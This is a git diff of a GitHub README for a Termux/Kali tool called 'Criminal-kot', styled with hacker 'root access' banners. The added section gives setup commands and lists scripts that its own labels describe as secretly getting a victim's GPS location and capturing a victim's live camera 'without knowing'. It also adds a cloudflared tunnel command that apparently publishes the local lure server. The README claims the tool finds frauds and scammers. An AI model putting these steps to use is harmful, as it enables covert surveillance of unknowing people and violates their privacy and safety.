@@ -4,7 +4,7 @@
 
   <br/><br/>
 
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=22&duration=3000&pause=1000&color=FF0033&center=true&vCenter=true&width=650&lines=THIS+REPO+HAS+BEEN+DETECTION;ACCESSED+BY+YEASIN+Hossain+MITUL;SECURITY+VERIFICATION+COMPLETE;ROOT+PRIVILEGES+GRANTED" alt="Typing SVG" />
+  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=22&duration=3000&pause=1000&color=FF0033&center=true&vCenter=true&width=650&lines=THIS+REPO+HAS+BEEN+DETECTION;ACCESSED+BY+YEASIN+HOSSAIN;SECURITY+VERIFICATION+COMPLETE;ROOT+PRIVILEGES+GRANTED" alt="Typing SVG" />
 
   <p align="center">
     <code>[ SYSTEM BREACH VERIFIED & SECURED BY DEV-MITUL ]</code>
@@ -24,13 +24,24 @@
 
 ---
 
-### <img src="https://cdn.simpleicons.org/matrix/FF0033" width="18" height="18" /> `ACCESS IDENTIFICATION & RECON`
+### <img src="https://cdn.simpleicons.org/matrix/FF0033" width="18" height="18" /> `Criminal TOOL RUN COMMAND`
 
 ```yaml
-[+] STATUS      : IDENTIFIED & ACCESSED
-[+] OPERATOR    : YEASIN HOSSAIN
-[+] CLEARANCE   : LEVEL 5 (ROOT)
-[+] ENCRYPTION  : SHA-256 / PROTOCOL MITUL-X
+[+] STORAGE           : termux-setup-storage
+[+] TOOL DIRECTORY    : cd Criminal-kot
+[+] ENVIRONTMENT      : KALI/TERMUX
+[+] PYTHON INSTALL    : pkg install python3
+[+] DEFICIENCY        : pip install requests
+[+] EXECUTION         : python3 GPS.py (Location hack #LIVE)
+[+] EXECUTION         : python3 XGPS.py (Location GPS #DANGER WITHOUT KHNOWING VIC)
+[+] EXECUTION         : python3 auto-click.py ( live cam HACK #DANGER )
+[+] EXECUTION         : python3 continuee.py ( live cam hack)
+[+] EXECUTION         : python3 redirect.py (POWERFULL TO victims live cam capture without knowing)
+
+
+[+] PUBLICK LINK      : pkg install cloudflared -y && cloudflared tunnel --url http://localhost:3333
+
+[+] ENCRYPTION  : CRIMINAL KOT IS VERY POWERFULL TOOL TO FIND FROUD/SCAMMER AND OTHER
 ```
 
 ---
